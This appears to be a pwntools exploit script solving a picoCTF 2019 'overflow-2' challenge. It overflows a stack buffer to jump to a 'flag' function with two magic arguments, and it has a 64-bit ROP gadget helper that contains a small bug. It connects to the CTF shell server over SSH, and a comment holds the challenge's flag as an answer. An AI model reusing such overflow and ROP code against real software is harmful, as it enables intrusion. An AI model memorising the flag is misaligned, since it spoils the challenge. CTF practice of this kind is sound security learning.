from pwn import *
import sys
import subprocess
import r2pipe
# picoCTF{arg5_and_r3turn52bc4561c}
argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

if context.bits == 64:
  r = process(['ROPgadget', '--binary', BINARY])
  gadgets = r.recvall().strip().split('\n')[2:-2]
  gadgets = map(lambda x: x.split(' : '),gadgets)
  gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
  r.close()

  pop_rdi = 0
  pop_rsi_r15 = 0
  pop_rdx = 0

  for addr, name in gadgets:
    if 'pop rdi ; ret' in name:
      pop_rdi = addr
    if 'pop rsi ; pop r15 ; ret' in name:
      pop_rsi_r15 = addr
    if 'pop rdx ; ret' in name:
      pop_rdx = addr

  def call(f, a1, a2, a3):
    out = ''
    if a1 != None:
      out += p64(pop_rdi)+p64(a1)
    if a2 != None:
      out += p64(pop_rsi_r15)+p64(a2)*2
    if a3 != None:
      if pop_rdx == 0:
        print 'RDX GADGET NOT FOUND'
        exit(-1)
      else:
        out += p64(rdx)+p64(a3)
    return out+p64(f)

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")
  sh = s.process('vuln', cwd='/problems/overflow-2_6_6a169d866c517f009d1489f240d26879')
  REMOTE = True


# $  r2 ./vuln
# [0x080484d0]> aaaa
# [0x080484d0]> afl~flag
# 0x080485e6    8 144          sym.flag
# [0x080484d0]> pdf @ sym.vuln
# / (fcn) sym.vuln 63
# |   sym.vuln ();
# |           ; var char *s @ ebp-0xb8
# |           ; var int32_t var_4h @ ebp-0x4

win_addr = 0x080485e6

payload = 'a'*(0xb8+4)+p32(win_addr)+'a'*4+p32(0xDEADBEEF)+p32(0xC0DED00D)

sh.sendlineafter(': ', payload)

sh.interactive()
  